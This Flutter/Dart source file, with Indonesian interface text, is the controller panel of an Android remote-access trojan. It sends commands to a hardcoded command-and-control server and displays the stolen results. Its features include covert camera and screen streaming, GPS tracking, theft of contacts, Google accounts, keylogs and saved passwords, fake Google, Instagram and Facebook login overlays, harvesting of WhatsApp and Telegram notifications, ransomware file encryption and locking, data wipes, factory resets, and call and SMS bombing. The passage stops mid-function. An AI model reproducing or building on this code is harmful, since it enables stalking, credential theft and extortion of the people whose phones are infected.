import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'package:url_launcher/url_launcher.dart'; 

const String SERVER_URL = "http://rizqynst.sano.biz.id:2000";

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? device;
  const ControlCenterPage({super.key, this.device});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

// Alias untuk kompatibilitas
class ControlPanelPage extends ControlCenterPage {
  const ControlPanelPage({super.key, required Map<String, dynamic> device}) 
      : super(device: device);
}

class _ControlCenterPageState extends State<ControlCenterPage> {
  bool _isSending = false;
  final List<String> _executionLogs = [];

  bool _isStreamingScreen = false;
  String _currentStreamFrame = "";
  StateSetter? _streamStateSetter;
  Timer? _streamPollingTimer;
  Timer? _streamHeartbeatTimer;

  final Color primaryRed = const Color(0xFFE53935);
  final Color darkBg = const Color(0xFF0F111E);
  final Color cardBg = const Color(0xFF1A1D2D);
  final Color textWhite = const Color(0xFFFFFFFF);
  final Color textGray = const Color(0xFF9E9E9E);

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _triggerAutoWakeup();
    });
  }

  @override
  void dispose() {
    _stopStreaming();
    _streamPollingTimer?.cancel();
    _streamHeartbeatTimer?.cancel();
    super.dispose();
  }

  void _triggerAutoWakeup() {
    final device = widget.device;
    if (device != null && device['id'] != null) {
      _sendCommand("force_open", device['id'].toString(), isSilent: true);
    }
  }

  void _addLog(String message) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, "[${DateTime.now().toString().substring(11, 19)}] $message");
        if (_executionLogs.length > 100) _executionLogs.removeLast(); 
      });
    }
  }

  void _stopStreaming() {
    _isStreamingScreen = false;
    _streamPollingTimer?.cancel();
    _streamPollingTimer = null;
    _streamHeartbeatTimer?.cancel();
    _streamHeartbeatTimer = null;
    _streamStateSetter = null;
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra, bool isSilent = false}) async {
    if (targetId == "unknown") {
      if (!isSilent) {
        _addLog("Error: ID Target tidak valid");
        _showNotif("ID TIDAK TERDETEKSI");
      }
      return;
    }

    if (!isSilent) {
      setState(() => _isSending = true);
      _addLog("Mengirim perintah: $command ke $targetId");
    }
    
    try {
      final response = await http.post(
        Uri.parse("$SERVER_URL/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": targetId, 
          "command": command, 
          "extra": extra ?? "", 
        }),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        if (!isSilent) _addLog("Perintah $command TERKIRIM");
        
        if (command == "take_photo") {
          _startPhotoPolling(targetId);
        } else if (command == "get_screen") {
          _startStreaming(targetId);
        } else {
          _startResponsePolling(command, targetId);
        }
      } else {
        if (!isSilent) {
          _addLog("Error: Target Offline");
          _showNotif("TARGET OFFLINE");
        }
      }
    } catch (e) {
      if (!isSilent) {
        _addLog("Error: Koneksi Gagal");
        _showNotif("KONEKSI ERROR");
      }
    } finally {
      if (!isSilent) setState(() => _isSending = false);
    }
  }

  void _startPhotoPolling(String targetId) {
    int attempts = 0;
    const int maxAttempts = 15;
    
    Timer.periodic(const Duration(seconds: 2), (timer) {
      attempts++;
      if (attempts > maxAttempts || !mounted) {
        timer.cancel();
        return;
      }
      
      _addLog("Menunggu foto... $attempts/$maxAttempts");
      
      http.get(Uri.parse("$SERVER_URL/api/get-response/$targetId")).then((response) {
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['data'] != null && data['cmd'] == "take_photo") {
            timer.cancel();
            _processPhotoResponse(data['data']);
          }
        }
      }).catchError((_) {});
    });
  }

  void _processPhotoResponse(dynamic data) {
    if (data == null) return;
    
    if (data['image_base64'] != null && data['image_base64'].isNotEmpty) {
      _addLog("📸 Foto berhasil diterima!");
      _showPhotoDialog(data['image_base64']);
    } else {
      _addLog("❌ Gagal menerima foto");
      _showNotif("FOTO GAGAL");
    }
  }

  void _startStreaming(String targetId) async {
    if (_isStreamingScreen) {
      _addLog("Stream sudah berjalan");
      return;
    }
    
    _addLog("🎬 Memulai Real Stream...");
    _isStreamingScreen = true;
    
    try {
      await http.post(
        Uri.parse("$SERVER_URL/api/stream/start/$targetId"),
        headers: {"Content-Type": "application/json"},
      );
      _addLog("Stream session registered");
    } catch (_) {}
    
    _showStreamDialog(targetId);
    
    _streamPollingTimer = Timer.periodic(const Duration(milliseconds: 800), (timer) async {
      if (!_isStreamingScreen || !mounted) {
        timer.cancel();
        return;
      }
      
      try {
        final response = await http.get(
          Uri.parse("$SERVER_URL/api/stream/frame/$targetId"),
        ).timeout(const Duration(seconds: 2));
        
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['success'] == true && data['frame'] != null && _streamStateSetter != null) {
            _streamStateSetter!(() {
              _currentStreamFrame = data['frame'];
            });
          }
        }
      } catch (_) {}
    });
    
    _streamHeartbeatTimer = Timer.periodic(const Duration(seconds: 5), (timer) async {
      if (!_isStreamingScreen || !mounted) {
        timer.cancel();
        return;
      }
      
      try {
        await http.post(
          Uri.parse("$SERVER_URL/api/stream/frame/$targetId"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"frame": "", "frameNumber": 0}),
        );
      } catch (_) {}
    });
  }

  void _showPhotoDialog(String base64Image) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text("📸 INSTANT PHOTO", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
        content: Container(
          width: double.infinity,
          constraints: BoxConstraints(
            maxHeight: MediaQuery.of(context).size.height * 0.6,
            maxWidth: MediaQuery.of(context).size.width * 0.8,
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(10),
            child: Image.memory(
              base64Decode(base64Image),
              fit: BoxFit.contain,
              errorBuilder: (_, __, ___) => const Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.broken_image, color: Colors.red, size: 50),
                  SizedBox(height: 10),
                  Text("Gagal memuat gambar", style: TextStyle(color: Colors.white)),
                ],
              ),
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context), 
            child: const Text("TUTUP", style: TextStyle(color: Color(0xFFE53935))),
          ),
        ],
      ),
    );
  }

  void _showStreamDialog(String targetId) {
    _currentStreamFrame = "";
    
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          _streamStateSetter = setDialogState;
          return AlertDialog(
            backgroundColor: cardBg,
            insetPadding: const EdgeInsets.all(10),
            title: Row(
              children: [
                const Icon(Icons.live_tv, color: Color(0xFFE53935), size: 18),
                const SizedBox(width: 10),
                const Text("REAL STREAM", style: TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  decoration: BoxDecoration(
                    color: Colors.red.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: const Text("LIVE", style: TextStyle(color: Colors.red, fontSize: 10, fontWeight: FontWeight.bold)),
                ),
              ],
            ),
            content: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 300,
                  height: 500,
                  decoration: BoxDecoration(
                    color: Colors.black,
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: const Color(0xFFE53935), width: 1),
                  ),
                  child: _currentStreamFrame.isNotEmpty 
                    ? ClipRRect(
                        borderRadius: BorderRadius.circular(10),
                        child: Image.memory(
                          base64Decode(_currentStreamFrame),
                          fit: BoxFit.contain,
                          gaplessPlayback: true,
                          errorBuilder: (_, __, ___) => const Center(
                            child: Column(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.error, color: Colors.red, size: 40),
                                SizedBox(height: 10),
                                Text("Stream error", style: TextStyle(color: Colors.white54)),
                              ],
                            ),
                          ),
                        ),
                      )
                    : const Center(
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            CircularProgressIndicator(color: Color(0xFFE53935)),
                            SizedBox(height: 10),
                            Text("Menunggu stream...", style: TextStyle(color: Colors.white54)),
                          ],
                        ),
                      ),
                ),
                const SizedBox(height: 10),
                const LinearProgressIndicator(color: Color(0xFFE53935), backgroundColor: Colors.white10),
                const SizedBox(height: 5),
                Text(
                  "Streaming real-time screen target",
                  style: const TextStyle(color: Colors.white38, fontSize: 10),
                ),
              ],
            ),
            actions: [
              TextButton(
                onPressed: () async {
                  _stopStreaming();
                  await http.post(
                    Uri.parse("$SERVER_URL/api/stream/stop/$targetId"),
                    headers: {"Content-Type": "application/json"},
                  );
                  if (mounted) Navigator.pop(context);
                  _addLog("⏹️ Stream dihentikan");
                }, 
                child: const Text("STOP STREAM", style: TextStyle(color: Color(0xFFE53935))),
              ),
            ],
          );
        },
      ),
    ).then((_) {
      _stopStreaming();
      http.post(
        Uri.parse("$SERVER_URL/api/stream/stop/$targetId"),
        headers: {"Content-Type": "application/json"},
      );
    });
  }

  void _startResponsePolling(String cmd, String targetId) {
    int attempts = 0;
    const int maxAttempts = 15;
    
    Timer.periodic(const Duration(seconds: 2), (timer) async {
      attempts++;
      if (attempts > maxAttempts || !mounted) {
        timer.cancel();
        return;
      }
      
      try {
        final response = await http.get(
          Uri.parse("$SERVER_URL/api/get-response/$targetId"),
        ).timeout(const Duration(seconds: 3));
        
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['data'] != null && data['cmd'] == cmd) {
            timer.cancel();
            _processResponse(cmd, data['data'], targetId);
          }
        }
      } catch (_) {}
    });
  }

  void _processResponse(String cmd, dynamic data, String targetId) {
    if (data == null) return;

    if (cmd == "get_location") {
      _addLog("📍 Koordinat GPS diterima.");
      _showLocationDialog(data['lat'], data['lng']);
    } 
    else if (cmd == "get_contacts") {
      _addLog("📱 Database kontak diunduh.");
      _showContactsDialog(data['contacts']);
    } 
    else if (cmd == "get_gmails") {
      _addLog("📧 Daftar Gmail ditarik.");
      _showGmailDialog(data['accounts'] ?? "No Accounts Found");
    } 
    else if (cmd == "vibrate_loop") {
      _addLog("📳 Target digetarkan.");
      _showNotif("TARGET BERGETAR");
    } 
    else if (cmd == "flash_strobe") {
      _addLog("⚡ Strobe Aktif.");
      _showNotif("STROBE ACTIVE");
    } 
    else if (cmd == "hard_lock") {
      _addLog("🔒 HARD LOCK: Device terkunci!");
      _showNotif("HARD LOCK ACTIVE");
    } 
    else if (cmd == "activate_ransomware") {
      _addLog("💀 RANSOMWARE LOCK: Files encrypted + Device locked!");
      _showNotif("RANSOMWARE ACTIVE");
    } 
    else if (cmd == "panic_mode") {
      _addLog("⚠️ PANIC MODE: Device locked! UNLOCK VIA CONTROLLER ONLY!");
      _showNotif("PANIC MODE ACTIVE");
    } 
    else if (cmd == "virus_mode") {
      _addLog("🦠 VIRUS MODE: Fake virus alert activated!");
      _showNotif("VIRUS MODE ACTIVE");
    } 
    else if (cmd == "panic_unlock") {
      _addLog("🔓 PANIC UNLOCK: Device unlocked!");
      _showNotif("PANIC MODE DISABLED");
    } 
    else if (cmd == "virus_unlock") {
      _addLog("🔓 VIRUS UNLOCK: Device unlocked!");
      _showNotif("VIRUS MODE DISABLED");
    } 
    else if (cmd == "decrypt_files") {
      _addLog("🔓 FILES DECRYPTED: Semua file kembali normal!");
      _showNotif("FILES DECRYPTED");
    } 
    else if (cmd == "factory_reset") {
      _addLog("💣 FACTORY RESET: Device akan direset!");
      _showNotif("FACTORY RESET INITIATED");
    } 
    else if (cmd == "wipe_data") {
      _addLog("🗑️ WIPE DATA: Semua file user telah dihapus!");
      _showNotif("DATA WIPED");
    } 
    else if (cmd == "call_bombing") {
      _addLog("📞 CALL BOMBING: Target akan menerima banyak panggilan!");
      _showNotif("CALL BOMBING ACTIVE");
    } 
    else if (cmd == "sms_bomber") {
      _addLog("📨 SMS BOMBER: Target akan menerima banyak SMS!");
      _showNotif("SMS BOMBER ACTIVE");
    } 
    else if (cmd == "battery_drain") {
      _addLog("🔋 BATTERY DRAIN: Baterai target akan cepat habis!");
      _showNotif("BATTERY DRAIN ACTIVE");
    }
    else if (cmd == "set_wallpaper") {
      _addLog("🖼️ Wallpaper berhasil diubah!");
      _showNotif("WALLPAPER UPDATED");
    }
    else if (cmd == "play_audio") {
      _addLog("🎵 Audio sedang diputar!");
      _showNotif("PLAYING AUDIO");
    }
    else if (cmd == "stop_audio") {
      _addLog("⏹️ Audio dihentikan!");
      _showNotif("AUDIO STOPPED");
    }
    else if (cmd == "flashlight_on") {
      _addLog("🔦 Flashlight ON!");
      _showNotif("FLASHLIGHT ON");
    }
    else if (cmd == "flashlight_off") {
      _addLog("🔦 Flashlight OFF!");
      _showNotif("FLASHLIGHT OFF");
    }
    else if (cmd == "open_url") {
      _addLog("🌐 URL opened on target!");
      _showNotif("URL OPENED");
    }
    else if (cmd == "force_open") {
      _addLog("📱 Force open executed!");
    }
    else if (cmd == "grab_gallery") {
      _addLog("📸 Gallery grabbed: ${data['count'] ?? 0} files");
      _showNotif("GALLERY GRABBED");
    }
    else if (cmd == "grab_videos") {
      _addLog("🎬 Videos grabbed: ${data['count'] ?? 0} files");
      _showNotif("VIDEOS GRABBED");
    }
    else if (cmd == "request_admin") {
      _addLog("👑 Device admin requested!");
      _showNotif("ADMIN REQUESTED");
    }
    else if (cmd == "is_admin") {
      _addLog("👑 Admin status: ${data['isAdmin'] == true ? "ACTIVE" : "NOT ACTIVE"}");
      _showNotif(data['isAdmin'] == true ? "ADMIN ACTIVE" : "ADMIN NOT ACTIVE");
    }
    else if (cmd == "admin_lock") {
      _addLog("🔒 Device locked via admin!");
      _showNotif("ADMIN LOCK");
    }
    else if (cmd == "admin_wipe") {
      _addLog("💣 Factory reset via admin!");
      _showNotif("ADMIN WIPE");
    }
    else if (cmd == "start_cam_stream") {
      _addLog("📷 Camera stream started!");
      _showNotif("CAMERA STREAM");
    }
    else if (cmd == "stop_cam_stream") {
      _addLog("📷 Camera stream stopped!");
      _showNotif("CAMERA STOPPED");
    }
    else if (cmd == "start_screen_stream") {
      _addLog("🎬 Screen stream started!");
      _showNotif("SCREEN STREAM");
    }
    else if (cmd == "stop_screen_stream") {
      _addLog("🎬 Screen stream stopped!");
      _showNotif("STREAM STOPPED");
    }
    else if (cmd == "record_audio") {
      _addLog("🎙️ Recording audio from target!");
      _showNotif("RECORDING AUDIO");
    }
    else if (cmd == "stop_record_audio") {
      _addLog("⏹️ Audio recording stopped!");
      _showNotif("RECORDING STOPPED");
    }
    // ==================== KEYLOGGER & PASSWORD ====================
    else if (cmd == "start_keylogger") {
      _addLog("⌨️ Keylogger started on target!");
      _showNotif("KEYLOGGER STARTED");
    }
    else if (cmd == "stop_keylogger") {
      _addLog("⌨️ Keylogger stopped!");
      _showNotif("KEYLOGGER STOPPED");
    }
    else if (cmd == "get_keylogs") {
      _addLog("📝 Keylogs retrieved: ${data['logs']?.length ?? 0} characters");
      _showKeyLogsDialog(data['logs'] ?? "No logs found");
    }
    else if (cmd == "get_saved_passwords") {
      _addLog("🔑 Saved passwords retrieved!");
      _showPasswordsDialog(data['passwords'] ?? "No passwords found");
    }
    else if (cmd == "start_fake_login") {
      _addLog("🎭 Fake login overlay started!");
      _showNotif("FAKE LOGIN ACTIVE");
    }
    else if (cmd == "stop_fake_login") {
      _addLog("🎭 Fake login overlay stopped!");
      _showNotif("FAKE LOGIN STOPPED");
    }
    else {
      _addLog("✅ Eksekusi $cmd Berhasil");
      _showNotif("PERINTAH BERHASIL");
    }
  }

  void _showKeyLogsDialog(String logs) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text("⌨️ KEYLOGGER LOGS", style: TextStyle(color: Color(0xFFE53935), fontSize: 14, fontWeight: FontWeight.bold)),
        content: Container(
          width: double.infinity,
          constraints: BoxConstraints(
            maxHeight: MediaQuery.of(context).size.height * 0.6,
            maxWidth: MediaQuery.of(context).size.width * 0.8,
          ),
          child: SingleChildScrollView(
            child: SelectableText(
              logs,
              style: const TextStyle(color: Colors.white, fontSize: 12, fontFamily: 'monospace'),
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context), 
            child: const Text("TUTUP", style: TextStyle(color: Color(0xFFE53935))),
          ),
        ],
      ),
    );
  }

  void _showPasswordsDialog(String passwords) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text("🔑 SAVED PASSWORDS", style: TextStyle(color: Color(0xFFE53935), fontSize: 14, fontWeight: FontWeight.bold)),
        content: Container(
          width: double.infinity,
          constraints: BoxConstraints(
            maxHeight: MediaQuery.of(context).size.height * 0.6,
            maxWidth: MediaQuery.of(context).size.width * 0.8,
          ),
          child: SingleChildScrollView(
            child: SelectableText(
              passwords,
              style: const TextStyle(color: Colors.greenAccent, fontSize: 12, fontFamily: 'monospace'),
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context), 
            child: const Text("TUTUP", style: TextStyle(color: Color(0xFFE53935))),
          ),
        ],
      ),
    );
  }

  void _showLocationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text("📍 LOKASI REAL-TIME", style: TextStyle(color: Colors.white, fontSize: 12)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(10)),
              child: SelectableText("KOORDINAT: $lat, $lng", style: const TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
            ),
            const SizedBox(height: 15),
            ClipRRect(
              borderRadius: BorderRadius.circular(15),
              child: Image.network(
                "https://static-maps.yandex.ru/1.x/?lang=en_US&ll=$lng,$lat&z=15&l=map&size=450,300",
                height: 200, 
                width: double.infinity, 
                fit: BoxFit.cover,
                errorBuilder: (_, __, ___) => const Icon(Icons.map, color: Colors.white, size: 50),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP")),
          TextButton(
            onPressed: () => launchUrl(
              Uri.parse("https://www.google.com/maps/search/?api=1&query=$lat,$lng"), 
              mode: LaunchMode.externalApplication
            ),
            child: const Text("BUKA MAPS", style: TextStyle(color: Color(0xFFE53935))),
          ),
        ],
      ),
    );
  }

  void _showContactsDialog(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: cardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
      builder: (context) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (context, scrollController) => Column(
          children: [
            const Padding(
              padding: EdgeInsets.all(15),
              child: Text("📱 KONTAK TARGET", style: TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold)),
            ),
            Expanded(
              child: ListView.builder(
                controller: scrollController,
                itemCount: contacts.length,
                itemBuilder: (context, i) => ListTile(
                  leading: const CircleAvatar(
                    backgroundColor: Color(0xFFE53935), 
                    child: Icon(Icons.person, color: Colors.black, size: 20),
                  ),
                  title: Text(contacts[i]['name'] ?? "No Name", style: const TextStyle(color: Colors.white, fontSize: 14)),
                  subtitle: Text(contacts[i]['number'] ?? "No Number", style: const TextStyle(color: Colors.white38, fontSize: 12)),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showGmailDialog(String emails) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text("📧 GOOGLE ACCOUNTS", style: TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
        content: Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(8)),
          child: SelectableText(
            emails,
            style: const TextStyle(color: Color(0xFFE53935), fontFamily: 'monospace', fontSize: 13),
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP", style: TextStyle(color: Color(0xFFE53935)))),
        ],
      ),
    );
  }

  void _showNotif(String m) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: const Color(0xFFE53935), 
        content: Text(m), 
        duration: const Duration(seconds: 1),
      ),
    );
  }

  void _showCameraMenu(String targetId) {
    String selectedCam = "back";
    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setState) => AlertDialog(
          backgroundColor: cardBg,
          title: const Text("📷 AMBIL FOTO", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text("Pilih kamera:", style: TextStyle(color: Colors.white54)),
              const SizedBox(height: 20),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  _cameraOption(Icons.camera_rear, "BELAKANG", "back", selectedCam, (val) => setState(() => selectedCam = val)),
                  _cameraOption(Icons.camera_front, "DEPAN", "front", selectedCam, (val) => setState(() => selectedCam = val)),
                ],
              ),
              const SizedBox(height: 20),
              ElevatedButton(
                onPressed: () {
                  _sendCommand("take_photo", targetId, extra: selectedCam);
                  Navigator.pop(context);
                },
                style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFFE53935)),
                child: const Text("AMBIL", style: TextStyle(color: Colors.white)),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _cameraOption(IconData icon, String label, String value, String current, Function(String) onTap) {
    bool isSelected = value == current;
    return GestureDetector(
      onTap: () => onTap(value),
      child: Column(
        children: [
          Icon(icon, size: 40, color: isSelected ? const Color(0xFFE53935) : Colors.white24),
          const SizedBox(height: 8),
          Text(label, style: TextStyle(color: isSelected ? const Color(0xFFE53935) : Colors.white24)),
        ],
      ),
    );
  }

  void _showInputDialog(String title, String cmd, String targetId) {
    final TextEditingController controller = TextEditingController();
    final TextEditingController pinController = TextEditingController();
    final TextEditingController phoneController = TextEditingController();
    final TextEditingController countController = TextEditingController();
    final TextEditingController messageController = TextEditingController();
    final TextEditingController soundController = TextEditingController();
    
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: Text(title, style: const TextStyle(color: Color(0xFFE53935))),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            if (cmd == "hard_lock") ...[
              TextField(
                controller: controller,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "Pesan Lock",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
              const SizedBox(height: 10),
              TextField(
                controller: pinController,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "PIN (default: 0853)",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
            ],
            if (cmd == "virus_mode") ...[
              TextField(
                controller: soundController,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "URL Sound (opsional)",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
              const SizedBox(height: 10),
              TextField(
                controller: messageController,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "Pesan Virus (opsional)",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
            ],
            if (cmd == "call_bombing") ...[
              TextField(
                controller: countController,
                keyboardType: TextInputType.number,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "Jumlah panggilan",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
            ],
            if (cmd == "sms_bomber") ...[
              TextField(
                controller: phoneController,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "Nomor target",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
              const SizedBox(height: 10),
              TextField(
                controller: countController,
                keyboardType: TextInputType.number,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "Jumlah SMS",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
              const SizedBox(height: 10),
              TextField(
                controller: messageController,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "Pesan",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
            ],
            if (cmd == "play_audio") ...[
              TextField(
                controller: controller,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "URL MP3",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
            ],
            if (cmd == "set_wallpaper") ...[
              TextField(
                controller: controller,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "URL Gambar",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
            ],
            if (cmd == "open_url") ...[
              TextField(
                controller: controller,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "URL Website",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
            ],
            if (cmd == "start_cam_stream") ...[
              TextField(
                controller: controller,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "Kamera (back/front)",
                  labelStyle: TextStyle(color: Colors.white54),
                  hintText: "back",
                ),
              ),
            ],
            if (cmd == "start_fake_login") ...[
              TextField(
                controller: controller,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: "App (google/instagram/facebook)",
                  labelStyle: TextStyle(color: Colors.white54),
                  hintText: "google",
                ),
              ),
            ],
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Batal")),
          ElevatedButton(
            onPressed: () {
              if (cmd == "hard_lock") {
                String msg = controller.text.trim();
                String pin = pinController.text.trim();
                if (msg.isEmpty) msg = "YOUR PHONE IS LOCKED";
                if (pin.isEmpty) pin = "0853";
                _sendCommand("hard_lock", targetId, extra: "$msg|$pin");
              } else if (cmd == "virus_mode") {
                String sound = soundController.text.trim();
                String msg = messageController.text.trim();
                if (sound.isNotEmpty && msg.isNotEmpty) {
                  _sendCommand("virus_mode", targetId, extra: "$sound|$msg");
                } else if (sound.isNotEmpty) {
                  _sendCommand("virus_mode", targetId, extra: sound);
                } else if (msg.isNotEmpty) {
                  _sendCommand("virus_mode", targetId, extra: msg);
                } else {
                  _sendCommand("virus_mode", targetId);
                }
              } else if (cmd == "call_bombing") {
                String count = countController.text.trim();
                _sendCommand("call_bombing", targetId, extra: count.isEmpty ? "50" : count);
              } else if (cmd == "sms_bomber") {
                String phone = phoneController.text.trim();
                String count = countController.text.trim();
                String msg = messageController.text.trim();
                _sendCommand("sms_bomber", targetId, extra: "$phone|$count|$msg");
              } else if (cmd == "play_audio") {
                _sendCommand("play_audio", targetId, extra: controller.text.trim());
              } else if (cmd == "set_wallpaper") {
                _sendCommand("set_wallpaper", targetId, extra: controller.text.trim());
              } else if (cmd == "open_url") {
                _sendCommand("open_url", targetId, extra: controller.text.trim());
              } else if (cmd == "start_cam_stream") {
                String side = controller.text.trim().isEmpty ? "back" : controller.text.trim();
                _sendCommand("start_cam_stream", targetId, extra: side);
              } else if (cmd == "start_fake_login") {
                String app = controller.text.trim().isEmpty ? "google" : controller.text.trim();
                _sendCommand("start_fake_login", targetId, extra: app);
              }
              Navigator.pop(context);
            },
            style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFFE53935)),
            child: const Text("Kirim"),
          ),
        ],
      ),
    );
  }

  void _showConfirmDialog(String title, String message, String cmd, String targetId) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: Text(title, style: const TextStyle(color: Color(0xFFE53935))),
        content: Text(message, style: const TextStyle(color: Colors.white)),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Batal")),
          ElevatedButton(
            onPressed: () {
              _sendCommand(cmd, targetId);
              Navigator.pop(context);
            },
            style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFFE53935)),
            child: const Text("Ya"),
          ),
        ],
      ),
    );
  }

  void _fetchNotificationLogs(String targetId) async {
    _addLog("Mengambil notifikasi...");
    try {
      final response = await http.get(
        Uri.parse("$SERVER_URL/api/get-notifications/$targetId"),
      );
      if (response.statusCode == 200) {
        final List logs = jsonDecode(response.body);
        _showNotificationLogsDialog(logs);
        _addLog("SUCCESS: ${logs.length} notifikasi");
      }
    } catch (_) {
      _addLog("Error mengambil notifikasi");
    }
  }

  void _showNotificationLogsDialog(List logs) {
    String selectedFilter = "ALL"; 

    showModalBottomSheet(
      context: context,
      backgroundColor: cardBg,
      isScrollControlled: true,
      builder: (context) => StatefulBuilder(
        builder: (context, setModalState) {
          List filteredLogs = logs.where((log) {
            String pkg = log['package']?.toString().toLowerCase() ?? "";
            if (selectedFilter == "WA") return pkg.contains("whatsapp");
            if (selectedFilter == "TELE") return pkg.contains("telegram");
            if (selectedFilter == "FB") return pkg.contains("facebook");
            if (selectedFilter == "GMAIL") return pkg.contains("gmail");
            return true;
          }).toList();

          return DraggableScrollableSheet(
            initialChildSize: 0.7,
            maxChildSize: 0.9,
            builder: (context, scrollController) => Column(
              children: [
                const Padding(
                  padding: EdgeInsets.all(15),
                  child: Text("NOTIFIKASI TARGET", style: TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold)),
                ),
                Expanded(
                  child: ListView.builder(
                    controller: scrollController,
                    itemCount: filteredLogs.length,
                    itemBuilder: (context, i) {
                      final log = filteredLogs[i];
                      return ListTile(
                        leading: const Icon(Icons.notifications, color: Color(0xFFE53935)),
                        title: Text(log['title'] ?? "", style: const TextStyle(color: Colors.white)),
                        subtitle: Text(log['body'] ?? "", style: const TextStyle(color: Colors.white54)),
                      );
                    },
